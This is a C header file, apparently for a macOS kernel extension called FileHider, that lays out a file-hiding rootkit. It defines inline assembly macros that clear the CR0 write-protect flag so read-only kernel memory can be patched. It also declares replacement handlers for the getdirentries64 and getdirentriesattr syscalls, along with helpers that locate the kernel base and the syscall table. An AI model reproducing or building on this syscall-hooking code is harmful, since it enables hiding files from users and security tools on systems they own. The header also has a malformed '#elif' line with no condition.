//
//  FileHider.h
//

#ifndef FileHider_FileHider_h
#define FileHider_FileHider_h

#include <mach/mach_types.h>
#include <mach-o/loader.h>
#include <sys/attr.h>
#include <sys/dirent.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/malloc.h>
#include <sys/systm.h>

#ifdef DEBUG
#define DLOG(args...)   printf(args)
#elif
#define DLOG(args...)   /* */
#endif

/* PAD() Macros */
#define PAD_(t) (sizeof(uint64_t) <= sizeof(t) ? 0 : sizeof(uint64_t) - sizeof(t))
#if BYTE_ORDER == LITTLE_ENDIAN
#define PADL_(t) 0
#define PADR_(t) PAD_(t)
#else
#define PADL_(t) PAD_(t)
#define PADR_(t) 0
#endif

#define MAXHIDELEN 256

// allow cpu to write to read-only pages by clearing wp flag in ctrl reg cr0
#define DISABLE_WRITE_PROTECTION() asm volatile ( \
"cli\n" \
"mov %cr0,%rax\n" \
"and $0xfffffffffffeffff,%rax\n" \
"mov %rax,%cr0" \
)
// re-enable write protection by re-setting wp flag in ctrl reg cr0
#define ENABLE_WRITE_PROTECTION() asm volatile ( \
"mov %cr0,%rax\n" \
"or $0x10000,%rax\n" \
"mov %rax,%cr0\n" \
"sti" \
)

uint64_t KERNEL_MH_START_ADDR;

/* syscall hooking defs */
typedef int32_t sy_call_t ( struct proc *, void *, int * );
typedef void sy_munge_t( const void *, void * );

/* original syscalls */
int (*org_getdirentriesattr) ( struct proc *p, void *uap, register_t *retval );
int (*org_getdirentries64) ( struct proc *p, void *uap, user_ssize_t *retval );

struct getdirentries64_args {
    char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
    char buf_l_[PADL_(user_addr_t)]; user_addr_t buf; char buf_r_[PADR_(user_addr_t)];
    char bufsize_l_[PADL_(user_size_t)]; user_size_t bufsize; char bufsize_r_[PADR_(user_size_t)];
    char position_l_[PADL_(user_addr_t)]; user_addr_t position; char position_r_[PADR_(user_addr_t)];
};

struct getdirentriesattr_args {
    char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
    char alist_l_[PADL_(user_addr_t)]; user_addr_t alist; char alist_r_[PADR_(user_addr_t)];
    char buffer_l_[PADL_(user_addr_t)]; user_addr_t buffer; char buffer_r_[PADR_(user_addr_t)];
    char buffersize_l_[PADL_(user_size_t)]; user_size_t buffersize; char buffersize_r_[PADR_(user_size_t)];
    char count_l_[PADL_(user_addr_t)]; user_addr_t count; char count_r_[PADR_(user_addr_t)];
    char basep_l_[PADL_(user_addr_t)]; user_addr_t basep; char basep_r_[PADR_(user_addr_t)];
    char newstate_l_[PADL_(user_addr_t)]; user_addr_t newstate; char newstate_r_[PADR_(user_addr_t)];
    char options_l_[PADL_(user_ulong_t)]; user_ulong_t options; char options_r_[PADR_(user_ulong_t)];
};

/* system call table definition */
struct sysent {
	int16_t          sy_narg;
	int8_t           sy_resv;
	int8_t           sy_flags;
	sy_call_t        *sy_call;
	sy_munge_t       *sy_arg_munge32;
	sy_munge_t       *sy_arg_munge64;
	int32_t          sy_return_type;
	uint16_t         sy_arg_bytes;
};

struct descriptor_idt
{
    uint16_t offset_low;
    uint16_t seg_selector;
    uint8_t reserved;
    uint8_t flag;
    uint16_t offset_middle;
    uint32_t offset_high;
    uint32_t reserved2;
};

struct nlist_64 {
    union {
        uint32_t  n_strx;   /* index into the string table */
    } n_un;
    uint8_t n_type;         /* type flag, see below */
    uint8_t n_sect;         /* section number or NO_SECT */
    uint16_t n_desc;        /* see <mach-o/stab.h> */
    uint64_t n_value;       /* value of this symbol (or stab offset) */
};

// return type was: register_t
int new_getdirentries64( struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval );
int new_getdirentriesattr( struct proc *p, struct getdirentriesattr_args *uap, register_t *retval );

struct segment_command_64 *find_segment_64(struct mach_header_64 *mh, const char *segname);
struct section_64 *find_section_64(struct segment_command_64 *seg, const char *name);
struct load_command *find_load_command(struct mach_header_64 *mh, uint32_t cmd);
void *find_symbol(struct mach_header_64 *mh, const char *name);
uint64_t find_kernel_baseaddr( void );
static struct sysent* find_sysent( void );

kern_return_t FileHider_start( kmod_info_t * ki, void *d );
kern_return_t FileHider_stop( kmod_info_t *ki, void *d );

#endif
